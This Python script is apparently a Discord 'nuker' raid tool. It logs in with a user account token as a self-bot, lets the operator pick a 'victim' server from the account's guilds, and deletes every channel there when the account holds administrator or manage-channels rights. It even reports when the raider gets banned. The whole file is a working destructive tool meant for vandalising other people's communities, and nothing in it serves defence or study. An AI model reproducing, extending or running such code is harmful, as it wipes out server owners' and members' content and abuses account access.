import discord
import time
import sys
import json
import random

def banner():   
    print('************************')   
    print('        N-u-ked         ')   
    print('************************')   
    print('')

# Raid functions----------------------------------------------------------
async def channel_delete_raid():
    print('[ + ] Deleting all existent channels')
    for channel in victim.channels:
        await channel.delete()
    print('[ + ] All channels deleted')
    raise KeyboardInterrupt

async def raid():
    permissions = victim.me.guild_permissions

    print('')
    print(f'Guild Name: {victim.name}')
    print(f'Guild ID  : {victim.id}')
    print('Raid details:')
    if(permissions.administrator):
        print('  >> Delete all channels')
    else:
        if(permissions.manage_channels):
            print('  >> Delete all channels')
        else:
            print('It seems like you don\'t have the appropriate permissions!\n')

    choice = input('\n Confirm delete? [y/n] ').lower()[0]
    if(choice == 'n'):
        return
    print('\n[ + ] Deletion started')

    if(permissions.administrator):
        # All possible raids
        print('[ * ] Admin permission found!')

        await channel_delete_raid()
        return
  
    if(permissions.manage_channels):
        await channel_delete_raid()


# Vairables----------------------------------------------------------------
with open('config.json', 'r') as handle:
    global token
    config = json.load(handle)
    token = config['token']
    if not token:
        print('Token not found!')
        token = input('Enter user token: ')
        config['token'] = token
        with open('config.json', 'w') as writer:
            json.dump(config, writer)

client = discord.Client()

@client.event
async def on_ready():
    print('Client connected!\n')
    time.sleep(1)

    print('Available servers:')

    for i in range(len(client.guilds)):
        print(f' >> [{i}] {client.guilds[i].name} ')
    
    global victim
    victim = client.guilds[int(input('\nEnter id of server to delete channels: '))]
    await raid()

@client.event
async def on_guild_remove(guild):
    if guild.id == victim.id:
        print('\n[ / ] YOU GOT BANNED')
        client.close()
        sys.exit(0)

# Main--------------------------------------------------------------------
banner()
client.run(token, bot=False)
